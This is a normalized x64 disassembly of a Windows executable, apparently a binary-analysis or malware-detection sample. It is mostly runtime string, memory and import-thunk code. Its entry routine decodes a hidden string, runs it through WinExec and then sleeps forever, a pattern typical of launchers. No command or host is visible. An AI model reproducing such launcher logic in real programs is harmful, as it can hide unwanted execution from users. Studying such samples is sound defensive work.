call sub_408950
lea rcx [ rbp + 0xc8 ]
mov rdx [ rbp + 0xc0 ]
call sub_4140a0
lea rcx [ rbp + 0xb0 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ rbp + 0xb8 ]
mov rdx [ rbp + 0xb0 ]
call sub_4140a0
mov rcx [ rbp + 0xc8 ]
mov rdx [ rbp + 0xb8 ]
mov r8d 0x1
call sub_408db0
test eax eax
je r-xdata
nop
jmp r-xdata
add edi 0x1
mov rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0xd8 ]
call sub_407ca0
mov rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0x130 ]
call sub_407ca0
jmp r-xdata
test ecx ecx
je r-xdata
mov ecx [ rax - 0x4 ]
lea rcx [ rbp + 0x88 ]
mov rdx [ rbp + 0x128 ]
call sub_408950
lea rcx [ rbp + 0x90 ]
mov rdx [ rbp + 0x88 ]
call sub_4140a0
lea rcx [ rbp + 0x78 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ rbp + 0x80 ]
mov rdx [ rbp + 0x78 ]
call sub_4140a0
mov rcx [ rbp + 0x90 ]
mov rdx [ rbp + 0x80 ]
mov r8d 0x1
call sub_408db0
test eax eax
je r-xdata
lea rcx [ rbp + 0xa0 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0xa0 ]
mov r8d 0x1
call sub_408db0
test eax eax
jne r-xdata
nop
lea rcx [ rbp + 0x48 ]
mov edx 0x11
call sub_407810
lea rcx [ rbp + 0xd0 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0x120 ]
mov edx 0x3
call sub_407840
mov rax [ rbp + 0x38 ]
lea rsp [ rbp + 0xe0 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
jmp r-xdata
add ebx 0x1
cmp ebx edi
jne r-xdata
mov sil 0x1
lea rcx [ rbp + 0x70 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x70 ]
mov r8d 0x1
call sub_408db0
test eax eax
je r-xdata
lea rcx [ rbp + 0x98 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x98 ]
mov r8d 0x1
call sub_408db0
test eax eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ rax - 0x4 ]
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
cmp [ rax ] 0x20
je r-xdata
lea rcx [ rbp + 0xa8 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0xa8 ]
mov r8d 0x1
call sub_408db0
test eax eax
je r-xdata
xor rsi rsi
jmp r-xdata
xor rdi rdi
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rcx ebx
cmp [ rax + rcx * 8 ] 0x0
je r-xdata
mov rcx [ rbp + 0x38 ]
lea rdx [ r-xdata ]
call sub_408020
jmp r-xdata
jmp r-xdata
mov rcx [ rbp + 0x38 ]
mov edx 0x1
mov r8d 0x1
call sub_408590
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
nop
lea rcx [ rbp + 0x68 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x68 ]
mov r8d 0x1
call sub_408db0
mov r13d eax
lea rcx [ rbp + 0x60 ]
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x60 ]
mov r8d 0x1
call sub_408db0
mov rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0x40 ]
mov rdx [ rdx + 0x8 ]
movsxd rbx ebx
mov rdx [ rdx + rbx * 8 ]
mov r8d r13d
add r8d 0x1
movsxd r8 r8d
mov r9d edi
sub r9d eax
movsxd r9 r9d
call sub_408510
jmp r-xdata
mov rax [ rbp + 0x40 ]
mov rax [ rax + 0x8 ]
movsxd rcx ebx
mov rax [ rax + rcx * 8 ]
mov edi [ rax - 0x4 ]
lea rcx [ rbp + 0x48 ]
mov rax [ rbp + 0x38 ]
mov rdx [ rax ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x48 ]
mov r8d 0x1
call sub_408db0
test eax eax
jne r-xdata
mov rax [ rbp + 0x38 ]
mov rcx [ rax ]
call sub_407d70
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx ]
movsxd rax eax
cmp [ rcx + rax - 0x1 ] 0x20
je r-xdata
test ecx ecx
je r-xdata
mov ecx [ rax - 0x4 ]
lea rcx [ rbp + 0x58 ]
mov rax [ rbp + 0x38 ]
mov rdx [ rax ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x58 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0xd0 ]
mov rdx [ rbp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x1
mov r9d eax
sub r9d 0x1
movsxd r9 r9d
call sub_408510
lea rcx [ rbp + 0x50 ]
mov rax [ rbp + 0x38 ]
mov rdx [ rax ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x50 ]
mov r8d 0x1
call sub_408db0
mov rcx [ rbp + 0x38 ]
mov edx 0x1
mov r8d eax
call sub_408590
xor rax rax
cmp [ rbp + 0xd0 ] 0x0
je r-xdata
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
test eax eax
je r-xdata
mov rax [ rbp + 0xd0 ]
mov eax [ rax - 0x4 ]
mov rax [ rbp + 0x38 ]
mov edx ecx
mov r8d 0x1
mov rcx rax
call sub_408590
mov ecx [ rax - 0x4 ]
xor rax rax
cmp [ rbp + 0xd0 ] 0x0
je r-xdata
jmp r-xdata
test eax eax
je r-xdata
mov rax [ rbp + 0xd0 ]
mov eax [ rax - 0x4 ]
mov rax [ rbp + 0xd0 ]
cmp [ rax ] 0x20
je r-xdata
xor rax rax
cmp [ rbp + 0xd0 ] 0x0
je r-xdata
jmp r-xdata
lea rcx [ rbp + 0xd0 ]
mov edx 0x1
mov r8d 0x1
call sub_408590
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
nop
test eax eax
je r-xdata
mov rax [ rbp + 0xd0 ]
mov eax [ rax - 0x4 ]
mov rcx [ rbp + 0xd0 ]
call sub_407d70
mov rcx [ rbp + 0xd0 ]
movsxd rax eax
cmp [ rcx + rax - 0x1 ] 0x20
je r-xdata
test ecx ecx
je r-xdata
mov ecx [ rax - 0x4 ]
cmp [ rbp + 0xd8 ] 0x0
je r-xdata
xor rax rax
cmp [ rbp + 0xd0 ] 0x0
je r-xdata
lea rcx [ rbp + 0xd8 ]
mov rdx [ rbp + 0xd0 ]
call sub_407d20
lea rcx [ rbp + 0xd8 ]
mov edx 0x3
mov r8 [ rbp + 0xd8 ]
lea r9 [ r-xdata ]
mov rax [ rbp + 0xd0 ]
mov [ rsp + 0x20 ] rax
call sub_4083b0
jmp r-xdata
lea rcx [ rbp + 0xd0 ]
mov edx eax
mov r8d 0x1
call sub_408590
mov rax [ rbp + 0xd0 ]
mov eax [ rax - 0x4 ]
sub_413ea0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x11
call sub_407810
lea rax [ rbx + rbp + 0xd0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0x120 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_413f60
push rbp
sub rsp 0x60
mov rbp rsp
mov [ rbp + 0x38 ] rcx
mov [ rbp + 0x44 ] r9d
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x78 ] rdx
mov [ rbp + 0x80 ] r8
mov rcx [ rbp + 0x78 ]
call sub_4078e0
mov rcx [ rbp + 0x80 ]
call sub_4078e0
nop
mov eax [ rbp + 0x44 ]
mov [ rbp + 0x40 ] eax
mov rcx [ rbp + 0x38 ]
lea rdx [ rbp + 0x58 ]
mov r8 [ rbp + 0x78 ]
mov r9 [ rbp + 0x80 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
mov rcx [ rbp + 0x58 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
nop
lea rcx [ rbp + 0x48 ]
call sub_407730
lea rcx [ rbp + 0x58 ]
call sub_407780
lea rcx [ rbp + 0x78 ]
mov edx 0x2
call sub_407840
mov eax [ rbp + 0x40 ]
lea rsp [ rbp + 0x60 ]
pop rbp
retn
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x58 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x54 ]
call sub_404e60
mov [ rbp + 0x40 ] eax
sub_414030
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_4140a0
push rbp
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x58 ] rdx
mov rcx [ rbp + 0x58 ]
call sub_4078c0
nop
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x58 ]
call sub_407bd0
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
mov ebx 0x1
mov esi ecx
cmp ebx esi
jg r-xdata
mov ecx [ rax - 0x4 ]
nop
nop
lea rcx [ rbp + 0x58 ]
call sub_407730
mov rax [ rbp + 0x28 ]
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rbp
retn
add esi 0x1
xor rax rax
movzx rax ax
bt [ r-xdata ] eax
setb al
jmp r-xdata
add ebx 0x1
cmp ebx esi
jne r-xdata
mov rcx [ rbp + 0x28 ]
call sub_407e60
movsxd rcx ebx
mov rdx [ rbp + 0x28 ]
mov rdx [ rdx ]
movsxd r8 ebx
movzx edx [ rdx + r8 * 2 - 0x2 ]
add edx 0x20
mov [ rax + rcx * 2 - 0x2 ] dx
test al al
je r-xdata
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
movsxd rcx ebx
movzx rax [ rax + rcx * 2 - 0x2 ]
sub ax 0x40
cmp ax 0x9f
ja r-xdata
_start
push rbp
sub rsp 0x20
mov rbp rsp
nop
lea rcx [ r-xdata ]
call sub_40a7b0
lea rcx [ r-xdata ]
xor rdx rdx
call WinExec
call sub_40c7a0
or ecx 0xffffffff
call Sleep
jmp r-xdata
sub_4014f6
add [ rax ] al
add [ rax ] al
add [ rax + rax - 0xf ] al
jmp rax
sub_4022b0
jmp [ rw-data ]
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_402320
jmp [ rw-data ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
sub_402360
jmp [ rw-data ]
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
GetStartupInfoW
jmp [ GetStartupInfoW@IAT ]
GetACP
jmp [ GetACP@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
sub_402600
mov rax [ rcx ]
mov [ rdx ] rax
retn
sub_402610
movdqa xmm0 [ rcx ]
mov r8 [ rcx + 0x10 ]
movdqa [ rdx ] xmm0
mov [ rdx + 0x10 ] r8
retn
sub_402630
movdqa xmm0 [ rcx ]
movdqa xmm1 [ rcx + 0x10 ]
mov r8 [ rcx + 0x20 ]
movdqa [ rdx ] xmm0
movdqa [ rdx + 0x10 ] xmm1
mov [ rdx + 0x20 ] r8
retn
sub_402650
movdqa xmm0 [ rcx ]
movdqa xmm1 [ rcx + 0x10 ]
movdqa xmm2 [ rcx + 0x20 ]
mov r8 [ rcx + 0x30 ]
movdqa [ rdx ] xmm0
movdqa [ rdx + 0x10 ] xmm1
movdqa [ rdx + 0x20 ] xmm2
mov [ rdx + 0x30 ] r8
retn
sub_403600
mov edx [ rcx - 0x8 ]
and edx 0xfffffff0
mov edx edx
lea rax [ rcx + rdx ]
mov edx [ rax - 0x8 ]
and edx 0xfffffff0
test edx edx
jne r-xdata
retn
xor rax rax
sub_404960
sub rsp 0x28
call sub_40a3e0
mov rax [ rax + 0x188 ]
test rax rax
je r-xdata
xor rax rax
mov rax [ rax + 0x10 ]
jmp r-xdata
add rsp 0x28
retn
sub_404990
sub rsp 0x28
call sub_40a3e0
mov rax [ rax + 0x188 ]
test rax rax
je r-xdata
xor rax rax
mov rax [ rax + 0x8 ]
jmp r-xdata
add rsp 0x28
retn
sub_404a10
sub rsp 0x28
mov [ rw-data ] rdx
call sub_407580
sub_404a20
add rsp 0x28
retn
sub_404a87
add rsp 0x28
pop rbx
pop rsi
retn
sub_404aac
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_404ca0
sub rsp 0x38
lea rcx [ rsp + 0x28 ]
call QueryPerformanceCounter
test eax eax
je r-xdata
call GetTickCount
mov [ rw-data ] eax
mov eax [ rsp + 0x28 ]
mov [ rw-data ] eax
jmp r-xdata
add rsp 0x38
retn
sub_404d00
push 0x0
fnstcw [ rsp ]
pop rax
retn
sub_404d10
push 0x0
stmxcsr [ rsp ]
pop rax
retn
sub_4050b0
sub rsp 0x28
mov [ rw-data ] 0x3
call sub_404d00
and ax 0x1f3f
mov [ rw-data ] ax
add rsp 0x28
retn
sub_4050e0
ldmxcsr [ rw-data ]
retn
sub_4050f0
push rbp
sub rsp 0x20
mov rbp rsp
mov cl 0x5
lea rax [ rbp + rbp + 0x28 ]
mov rdx rbp
neg rdx
mov rdx [ rax + rdx ]
call sub_404a30
sub_40510e
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_405120
mov rax [ rcx ]
retn
sub_405243
inc [ rcx ]
add [ rax ] al
add [ rsi ] ch
add [ rax ] al
add ah cl
int3
sub_4052f0
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_405320
mov rax [ rcx - 0x78 ]
test rax rax
je r-xdata
retn
mov rax [ rax ]
sub_405360
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rbx
call sub_405530
mov rcx rbx
call sub_4047b0
add rsp 0x20
pop rbx
retn
sub_405380
retn
sub_405390
retn
sub_4053a0
retn
sub_4053b0
mov eax [ rcx - 0x80 ]
retn
sub_405440
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_405620
cmp rdx rcx
sete al
retn
sub_405630
mov rax rcx
shr rax 0x20
xor ecx eax
mov eax ecx
retn
sub_405720
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_409ca0
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_4057d0
mov rax [ rcx - 0xc0 ]
retn
sub_405990
xor rax rax
mov rcx [ rcx - 0x78 ]
test rcx rcx
je r-xdata
mov al 0x1
jmp r-xdata
nop
retn
mov rcx [ rcx ]
jmp r-xdata
cmp rcx rdx
jne r-xdata
sub_4059b0
mov rax [ rcx - 0xa8 ]
retn
sub_4059c0
mov eax 0x8000ffff
retn
sub_4059d0
push rbx
sub rsp 0x20
mov rbx rdx
mov rcx [ rcx ]
mov rdx rbx
call sub_405130
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_4059f0
retn
sub_405a00
retn
sub_405a10
retn
sub_405bc0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rbx
call sub_40a010
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_405d70
sub rsp 0x28
mov rax rcx
test dl dl
jl r-xdata
add rsp 0x28
retn
mov rcx rax
call [ rax - 0x30 ]
sub_405d90
push rbx
sub rsp 0x20
mov rax rcx
mov rbx [ rcx ]
mov rcx rax
call [ rbx - 0x28 ]
add rsp 0x20
pop rbx
retn
sub_405e00
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_405e10
push rbx
sub rsp 0x20
test dl dl
jle r-xdata
add rsp 0x20
pop rbx
retn
mov rax rcx
mov rbx [ rcx ]
mov rcx rax
call [ rbx - 0x48 ]
sub_405e30
sub rsp 0x28
call sub_405ea0
cmp [ rax ] 0x0
je r-xdata
add rsp 0x28
retn
mov rcx [ rax ]
mov [ rax ] 0x0
call sub_405e60
sub_405ea0
mov rax [ rcx ]
movsxd rax [ rax - 0x80 ]
lea rax [ rcx + rax - 0x8 ]
retn
sub_405eb0
sub rsp 0x28
cmp [ rw-data ] 0x1
jbe r-xdata
add rsp 0x28
retn
mov ecx 0xeedfadf
xor rdx rdx
xor r8 r8
xor r9 r9
call [ rw-data ]
sub_405f20
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov ecx 0xeedfae0
xor rdx rdx
mov r8d 0x1
lea r9 [ rsp + 0x30 ]
call [ rw-data ]
add rsp 0x28
retn
sub_405f50
sub rsp 0x28
cmp [ rw-data ] 0x1
jbe r-xdata
add rsp 0x28
retn
call sub_405f20
sub_405f70
sub rsp 0x28
cmp [ rw-data ] 0x1
jbe r-xdata
add rsp 0x28
retn
call sub_405f20
sub_405f90
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
cmp [ rw-data ] 0x1
jbe r-xdata
add rsp 0x28
retn
mov ecx 0xeedfae1
xor rdx rdx
mov r8d 0x1
lea r9 [ rsp + 0x30 ]
call [ rw-data ]
sub_405fd0
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
cmp [ rw-data ] 0x1
jbe r-xdata
add rsp 0x28
retn
mov ecx 0xeedfae2
xor rdx rdx
mov r8d 0x1
lea r9 [ rsp + 0x30 ]
call [ rw-data ]
sub_406d60
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rbp + rbp + 0x28 ]
mov rdx rbp
neg rdx
mov rdx [ rax + rdx ]
call sub_406c40
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_406fa0
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_407050
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_407150
push rbx
sub rsp 0x20
mov rbx rcx
call GetProcessHeap
mov rcx rax
xor rdx rdx
mov r8 rbx
call HeapAlloc
add rsp 0x20
pop rbx
retn
sub_407180
push rbx
sub rsp 0x20
mov rbx rcx
call GetProcessHeap
mov rcx rax
xor rdx rdx
mov r8 rbx
call HeapFree
xor rax rax
add rsp 0x20
pop rbx
retn
sub_407250
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_407290
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rbx
call sub_405530
mov rcx rbx
call sub_407180
add rsp 0x20
pop rbx
retn
sub_4073cf
inc [ rdx ]
add [ rax ] al
add [ 0xffffffffcd0c73e3 ] cl
int3
sub_407572
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
sub_407580
sub rsp 0x28
mov [ rw-data ] ecx
call sub_4073e0
sub_40758f
add rsp 0x28
retn
sub_4075c7
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_407615
add rsp 0x28
pop rbx
pop rsi
retn
sub_407700
push rbp
sub rsp 0x20
mov rbp rsp
mov cl 0x1
lea rax [ rbp + rbp + 0x28 ]
mov rdx rbp
neg rdx
mov rdx [ rax + rdx ]
call sub_404a30
sub_40771e
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_407950
sub rsp 0x28
mov eax [ rw-data ]
mov [ rsp + 0x20 ] eax
call sub_407900
add rsp 0x28
retn
sub_407d60
xor rax rax
test rcx rcx
je r-xdata
retn
mov eax [ rcx - 0x4 ]
sub_407d80
xor rax rax
test rcx rcx
je r-xdata
retn
jmp r-xdata
movsxd rdx eax
cmp [ rcx + rdx ] 0x0
jne r-xdata
add eax 0x1
sub_4084d7
inc [ rax ]
add [ rax ] al
add [ rax ] al
add [ rax ] al
int3
sub_408ee0
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov cl 0x10
call sub_404a90
call [ rw-data ]
jmp r-xdata
add rsp 0x28
retn
sub_409080
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov cl 0x10
call sub_404a90
call [ rw-data ]
jmp r-xdata
add rsp 0x28
retn
sub_409480
sub rsp 0x28
call sub_4092a0
add rsp 0x28
retn
sub_409490
sub rsp 0x28
call sub_408f10
add rsp 0x28
retn
sub_4094a0
push rbp
sub rsp 0x20
mov rbp rsp
mov cl 0x11
lea rax [ rbp + rbp + 0x28 ]
mov rdx rbp
neg rdx
mov rdx [ rax + rdx ]
call sub_404a30
sub_4094be
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_409840
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_409940
test rcx rcx
je r-xdata
retn
mov eax 0x1
[ rcx - 0xc ] eax
sub_409a70
sub rsp 0x28
lea rcx [ rw-data ]
call DeleteCriticalSection
add rsp 0x28
retn
sub_409af0
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_409b00
mov rax [ rw-data ]
mov [ rcx ] rax
mov [ rw-data ] rcx
retn
sub_409fe0
push rbp
sub rsp 0x20
mov rbp rsp
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rsp [ rbp + 0x20 ]
pop rbp
retn
sub_40a010
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rbx
call sub_409f30
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_40a030
sub rsp 0x48
mov rax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] rax
mov eax [ rsp + 0x78 ]
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x80 ]
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x88 ]
mov [ rsp + 0x38 ] rax
call WideCharToMultiByte
add rsp 0x48
retn
sub_40a070
sub rsp 0x38
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x28 ] eax
call MultiByteToWideChar
add rsp 0x38
retn
sub_40a090
sub rsp 0x58
lea rcx [ rsp + 0x20 ]
call GetSystemInfo
mov eax [ rsp + 0x40 ]
add rsp 0x58
retn
sub_40a100
mov rax [ rcx ]
cmp rax [ rdx ]
jne r-xdata
xor rax rax
jmp r-xdata
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + 0x8 ]
je r-xdata
retn
mov al 0x1
sub_40a120
sub rsp 0x28
call sub_40a100
test al al
sete al
add rsp 0x28
retn
sub_40a140
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rbx
mov edx 0x10
xor r8 r8
call sub_404d90
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_40a2b0
jmp [ rw-data ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
LocalFree
jmp [ LocalFree@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
sub_40a350
sub rsp 0x28
mov eax 0x40
mov edx ecx
mov ecx eax
call LocalAlloc
add rsp 0x28
retn
sub_40a370
lea rax [ 0x194 ]
retn
sub_40a440
sub rsp 0x28
lea rcx [ rw-data ]
call sub_409b00
add rsp 0x28
retn
sub_40a460
retn
sub_40a7a0
sub rsp 0x28
call sub_406dd0
add rsp 0x28
retn
sub_40ad80
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
movsxd rcx [ rax + 0x3c ]
mov rax [ rsp + 0x8 ]
add rax rcx
retn
sub_40ada0
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
mov eax [ rax + 0x8 ]
retn
sub_40b0b0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_40b350
mov r8d eax
shl r8 0x3
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_40b0f0
add rsp 0x28
retn
sub_40b2a0
sub rsp 0x28
xor ecx ecx
call sub_40ae00
add rsp 0x28
retn
sub_40b2b0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
mov rcx [ rsp + 0x10 ]
mov rax [ rsp + 0x8 ]
sub rax rcx
sar rax 0x3
retn
sub_40b2d0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
mov rax [ rsp + 0x38 ]
mov [ rcx + 0x8 ] rax
mov rcx [ rsp + 0x30 ]
call sub_40b320
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_40b300
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x30 ]
mov ecx 0x40
call LocalAlloc
add rsp 0x28
retn
sub_40b320
mov [ rsp + 0x8 ] rcx
mov rcx [ rsp + 0x8 ]
mov rax [ rw-data ]
mov [ rcx ] rax
mov rax [ rsp + 0x8 ]
mov [ rw-data ] rax
retn
sub_40b3e0
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_40b420
add rsp 0x28
retn
sub_40b400
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call LocalFree
add rsp 0x28
retn
sub_40b4c0
mov [ rsp + 0x8 ] ecx
mov ecx [ rsp + 0x8 ]
lea rax [ __dos_header ]
add rax rcx
retn
sub_40b4e0
mov [ rsp + 0x8 ] ecx
mov ecx [ rsp + 0x8 ]
lea rax [ __dos_header ]
add rax rcx
retn
sub_40b500
mov [ rsp + 0x8 ] ecx
mov ecx [ rsp + 0x8 ]
lea rax [ __dos_header ]
add rax rcx
retn
sub_40b520
mov [ rsp + 0x8 ] ecx
mov ecx [ rsp + 0x8 ]
lea rax [ __dos_header ]
add rax rcx
retn
sub_40b540
mov [ rsp + 0x8 ] ecx
mov ecx [ rsp + 0x8 ]
lea rax [ __dos_header ]
add rax rcx
retn
sub_40b560
mov [ rsp + 0x8 ] ecx
mov ecx [ rsp + 0x8 ]
lea rax [ __dos_header ]
add rax rcx
retn
sub_40b580
mov [ rsp + 0x8 ] ecx
mov ecx [ rsp + 0x8 ]
lea rax [ __dos_header ]
add rax rcx
retn
sub_40b5a0
sub rsp 0x28
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x28
retn
call sub_40b2a0
sub_40b5c0
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
sub_40b5d0
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_40b5e0
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
sub_40b5f0
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
retn
sub_40b600
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
retn
CloseHandle
jmp [ CloseHandle@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
FindClose
